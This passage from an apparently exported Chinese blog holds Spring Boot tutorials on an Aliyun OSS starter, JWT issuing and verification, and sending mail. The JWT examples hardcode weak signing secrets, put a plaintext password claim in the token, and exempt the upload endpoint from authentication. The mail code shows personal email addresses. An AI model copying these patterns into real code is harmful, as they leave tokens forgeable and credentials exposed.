<h3 id="4-调整AliOSSUtils类"><a href="#4-调整AliOSSUtils类" class="headerlink" title="4. 调整AliOSSUtils类"></a>4. 调整AliOSSUtils类</h3><p><img src="/images/image24.png" alt="alt text"></p>
<p>如果将AliOSSUtils类中的accessKeyId、accessKeySecret、bucketName、endpoint等参数配置到application.properties中，那么就需要使用<code>@EnableConfigurationProperties</code>注解来启用配置属性，同时也需要为new AliOSSUtils()添加一个构造方法，将配置属性传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;aliyun.oss&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AliOSSProperties</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String accessKeyId;</span><br><span class="line">    <span class="keyword">private</span> String accessKeySecret;</span><br><span class="line">    <span class="keyword">private</span> String bucketName;</span><br><span class="line">    <span class="keyword">private</span> String endpoint;</span><br><span class="line">    <span class="comment">// getter and setter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样properties类中的属性值就可以从application.properties中读取</p>
<h3 id="5-配置META-INF-spring-org-springframework-boot-autoconfigure-AutoConfiguration-imports"><a href="#5-配置META-INF-spring-org-springframework-boot-autoconfigure-AutoConfiguration-imports" class="headerlink" title="5. 配置META-INF&#x2F;spring&#x2F;org.springframework.boot.autoconfigure.AutoConfiguration.imports"></a>5. 配置META-INF&#x2F;spring&#x2F;org.springframework.boot.autoconfigure.AutoConfiguration.imports</h3><figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">com.aliyun.oss.AliOSSAutoConfiguration</span> <span class="string"></span></span><br></pre></td></tr></table></figure>

<p>填写自动配置类的全路径，实现自动配置</p>
<p><img src="/images/image25.png" alt="alt text"></p>
<h3 id="6-测试"><a href="#6-测试" class="headerlink" title="6. 测试"></a>6. 测试</h3><p>在starter项目中的pom.xml中添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.aliyun.oss<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aliyun-oss-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后配置properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">aliyun.oss.access-key-id</span>=<span class="string">xxx</span></span><br><span class="line"><span class="attr">aliyun.oss.access-key-secret</span>=<span class="string">xxx</span></span><br><span class="line"><span class="attr">aliyun.oss.bucket-name</span>=<span class="string">xxx</span></span><br><span class="line"><span class="attr">aliyun.oss.endpoint</span>=<span class="string">xxx</span></span><br></pre></td></tr></table></figure>

<p>然后就可以使用@Autowired注入AliOSSUtils类，调用方法上传文件了…</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说实话，真的会在实际项目中用到这个东西吗？不过了解一下也是好的，毕竟springboot的自动配置机制是非常强大的，可以帮助我们简化很多工作…</p>
]]></content>
      <tags>
        <tag>spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>jwt</title>
    <url>/2025/03/25/jwt/</url>
    <content><![CDATA[<h2 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h2><p>xxx.yyy.zzz -&gt; header.payload.signature</p>
<h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>header标记了使用的算法和token的类型</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload中存放了一些数据，比如用户id、用户名等，还有一个<code>iat</code>字段，表示token的签发时间</p>
<p>ps. payload中的数据不要存放敏感信息，因为payload是可以解码的</p>
<h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>signature是对header和payload的签名，防止数据被篡改，当服务端接收到token后，会重新计算一次签名，如果签名不一致，说明数据被篡改</p>
<h3 id="两种使用方式"><a href="#两种使用方式" class="headerlink" title="两种使用方式"></a>两种使用方式</h3><ol>
<li>使用<code>java-jwt</code>库</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.auth0<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>java-jwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWT;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.JWTCreator;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.algorithms.Algorithm;</span><br><span class="line"><span class="keyword">import</span> com.auth0.jwt.interfaces.DecodedJWT;</span><br><span class="line"><span class="keyword">import</span> java.util.Calendar;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTUtils</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成token  header.payload.singature</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SING</span> <span class="operator">=</span> <span class="string">&quot;!Q@W#E$R&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getToken</span><span class="params">(Map&lt;String, String&gt; map)</span> &#123;</span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">instance</span> <span class="operator">=</span> Calendar.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 默认7天过期</span></span><br><span class="line">        <span class="comment">// instance.add(Calendar.DATE, 7);</span></span><br><span class="line">        <span class="comment">// 120秒过期</span></span><br><span class="line">        instance.add(Calendar.SECOND, <span class="number">120</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建jwt builder</span></span><br><span class="line">        JWTCreator.<span class="type">Builder</span> <span class="variable">builder</span> <span class="operator">=</span> JWT.create();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// payload</span></span><br><span class="line">        map.forEach((k, v) -&gt; &#123;</span><br><span class="line">            builder.withClaim(k, v);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> builder.withExpiresAt(instance.getTime())  <span class="comment">//指定令牌过期时间</span></span><br><span class="line">                .sign(Algorithm.HMAC256(SING));  <span class="comment">// sign</span></span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证token  合法性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> DecodedJWT <span class="title function_">verify</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JWT.require(Algorithm.HMAC256(SING)).build().verify(token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.dunjia.jwtdemo.utils.JWTUtils;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JWTInterceptors</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 获取请求头中令牌</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; JWTUtils.verify(token) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            map.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;token无效，请重新登录！&quot;</span>);</span><br><span class="line">            map.put(<span class="string">&quot;state&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.dunjia.jwtdemo.interceptor.JWTInterceptors;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InterceptorConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JWTInterceptors jwtInterceptors;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(jwtInterceptors)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/user/**&quot;</span>)  <span class="comment">// 其他接口token验证</span></span><br><span class="line">                .excludePathPatterns(<span class="string">&quot;/user/login&quot;</span>);  <span class="comment">// 所有用户都放行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>使用<code>jjwt</code>库</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io.jsonwebtoken.JwtBuilder;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.Jwts;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.SignatureAlgorithm;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>; <span class="comment">// 24 hour</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> <span class="string">&quot;#@!$%^&amp;*()&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 生成token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">createToken</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">JwtBuilder</span> <span class="variable">jwtBuilder</span> <span class="operator">=</span> Jwts.builder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">jwtToken</span> <span class="operator">=</span> jwtBuilder</span><br><span class="line">                <span class="comment">// header</span></span><br><span class="line">                .setHeaderParam(<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;JWT&quot;</span>)</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;alg&quot;</span>, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">                <span class="comment">// payload</span></span><br><span class="line">                .claim(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                .setSubject(<span class="string">&quot;jwt-token&quot;</span>)</span><br><span class="line">                .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis() + time))</span><br><span class="line">                .setId(UUID.randomUUID().toString())</span><br><span class="line">                <span class="comment">// signature</span></span><br><span class="line">                .signWith(SignatureAlgorithm.HS256, signature)</span><br><span class="line">                .compact();</span><br><span class="line">        <span class="keyword">return</span> jwtToken;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 校验token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> token</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">verifyToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Jwts.parser().setSigningKey(signature).parseClaimsJws(token);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// 放行OPTIONS请求</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;OPTIONS&quot;</span>.equals(request.getMethod())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取请求头中的token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token != <span class="literal">null</span> &amp;&amp; token.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 截取token</span></span><br><span class="line">            token = token.substring(<span class="number">7</span>);</span><br><span class="line">            <span class="comment">// 验证token</span></span><br><span class="line">            <span class="keyword">if</span> (JwtUtil.verifyToken(token)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// token无效，返回401</span></span><br><span class="line">        response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.ResourceHandlerRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="keyword">import</span> com.dunjia.back.utils.JwtInterceptor;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> JwtInterceptor jwtInterceptor;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(jwtInterceptor)</span><br><span class="line">                .addPathPatterns(<span class="string">&quot;/api/**&quot;</span>)  <span class="comment">// 拦截所有/api/**的请求</span></span><br><span class="line">                .excludePathPatterns(        <span class="comment">// 不拦截以下路径</span></span><br><span class="line">                        <span class="string">&quot;/api/login&quot;</span>,        <span class="comment">// 登录接口</span></span><br><span class="line">                        <span class="string">&quot;/api/register&quot;</span>,     <span class="comment">// 注册接口</span></span><br><span class="line">                        <span class="string">&quot;/api/upload&quot;</span>,       <span class="comment">// 上传图片接口</span></span><br><span class="line">                        <span class="string">&quot;/image/**&quot;</span>          <span class="comment">// 静态资源</span></span><br><span class="line">                );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>spring boot</tag>
      </tags>
  </entry>
  <entry>
    <title>mail</title>
    <url>/2025/03/25/mail/</url>
    <content><![CDATA[<h2 id="mail"><a href="#mail" class="headerlink" title="mail"></a>mail</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-mail<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># SMTP server configuration</span></span><br><span class="line"><span class="string">spring.mail.host=smtp.qq.com</span></span><br><span class="line"><span class="comment"># SMTP port</span></span><br><span class="line"><span class="string">spring.mail.port=465</span></span><br><span class="line"><span class="comment"># mail user name</span></span><br><span class="line"><span class="string">spring.mail.username=516348828@qq.com</span></span><br><span class="line"><span class="comment"># auth code</span></span><br><span class="line"><span class="string">spring.mail.password=xxxxxxxxxxxx</span></span><br><span class="line"><span class="comment"># default encoding</span></span><br><span class="line"><span class="string">spring.mail.default-encoding=UTF-8</span></span><br><span class="line"><span class="comment"># mail protocol ssl</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.socketFactoryClass=javax.net.ssl.SSLSocketFactory</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mail debug</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.debug=true</span></span><br><span class="line"><span class="comment"># mail protocol smtp</span></span><br><span class="line"><span class="string">spring.mail.protocol=smtp</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.ssl.enable=true</span></span><br><span class="line"><span class="string">spring.mail.properties.mail.smtp.socketFactory.port=465</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendSimpleMail</span><span class="params">()</span> &#123; <span class="comment">// simple mail</span></span><br><span class="line">    <span class="type">SimpleMailMessage</span> <span class="variable">message</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMailMessage</span>();</span><br><span class="line">    message.setSubject(<span class="string">&quot;这是一封测试邮件&quot;</span>);</span><br><span class="line">    message.setFrom(<span class="string">&quot;516348828@qq.com&quot;</span>);</span><br><span class="line">    message.setTo(<span class="string">&quot;13433126742@163.com&quot;</span>);</span><br><span class="line"><span class="comment">//        message.setCc(&quot;xxxxxx@qq.com&quot;);</span></span><br><span class="line"><span class="comment">//        message.setBcc(&quot;xxxxx@qq.com&quot;);</span></span><br><span class="line">    message.setSentDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    message.setText(<span class="string">&quot;这是测试邮件的正文&quot;</span>);</span><br><span class="line">    javaMailSender.send(message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendAttachFileMail</span><span class="params">()</span> <span class="keyword">throws</span> MessagingException &#123; <span class="comment">// attach file mail</span></span><br><span class="line">    <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> javaMailSender.createMimeMessage();</span><br><span class="line">    <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line">    helper.setSubject(<span class="string">&quot;这是一封测试邮件&quot;</span>);</span><br><span class="line">    helper.setFrom(<span class="string">&quot;516348828@qq.com&quot;</span>);</span><br><span class="line">    helper.setTo(<span class="string">&quot;13433126742@163.com&quot;</span>);</span><br><span class="line"><span class="comment">//        helper.setCc(&quot;xxxxxx@qq.com&quot;);</span></span><br><span class="line"><span class="comment">//        helper.setBcc(&quot;xxxxx@qq.com&quot;);</span></span><br><span class="line">    helper.setSentDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    helper.setText(<span class="string">&quot;这是测试邮件的正文&quot;</span>);</span><br><span class="line">    helper.addAttachment(<span class="string">&quot;测试图片.jpg&quot;</span>, <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\图片\\Wallhaven\\微信图片_20241222141141.jpg&quot;</span>));</span><br><span class="line">    javaMailSender.send(mimeMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendImgResMail</span><span class="params">()</span> <span class="keyword">throws</span> MessagingException &#123; <span class="comment">// img res mail</span></span><br><span class="line">    <span class="type">MimeMessage</span> <span class="variable">mimeMessage</span> <span class="operator">=</span> javaMailSender.createMimeMessage();</span><br><span class="line">    <span class="type">MimeMessageHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeMessageHelper</span>(mimeMessage, <span class="literal">true</span>);</span><br><span class="line">    helper.setSubject(<span class="string">&quot;这是一封测试邮件&quot;</span>);</span><br><span class="line">    helper.setFrom(<span class="string">&quot;516348828@qq.com&quot;</span>);</span><br><span class="line">    helper.setTo(<span class="string">&quot;13433126742@163.com&quot;</span>);</span><br><span class="line"><span class="comment">//        helper.setCc(&quot;xxxxx@qq.com&quot;);</span></span><br><span class="line"><span class="comment">//        helper.setBcc(&quot;xxxxx@qq.com&quot;);</span></span><br><span class="line">    helper.setSentDate(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    helper.setText(<span class="string">&quot;&lt;p&gt;hello 大家好，这是一封测试邮件，这封邮件包含两种图片，分别如下&lt;/p&gt;&lt;p&gt;第一张图片：&lt;/p&gt;&lt;img src=&#x27;cid:p01&#x27;/&gt;&lt;p&gt;第二张图片：&lt;/p&gt;&lt;img src=&#x27;cid:p02&#x27;/&gt;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    helper.addInline(<span class="string">&quot;p01&quot;</span>, <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\图片\\Wallhaven\\微信图片_20241222141128.jpg&quot;</span>)));</span><br><span class="line">    helper.addInline(<span class="string">&quot;p02&quot;</span>, <span class="keyword">new</span> <span class="title class_">FileSystemResource</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;D:\\图片\\Wallhaven\\微信图片_20241222141136.jpg&quot;</span>)));</span><br><span class="line">    javaMailSender.send(mimeMessage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="thymeleaf"><a href="#thymeleaf" class="headerlink" title="thymeleaf"></a>thymeleaf</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>…</p>
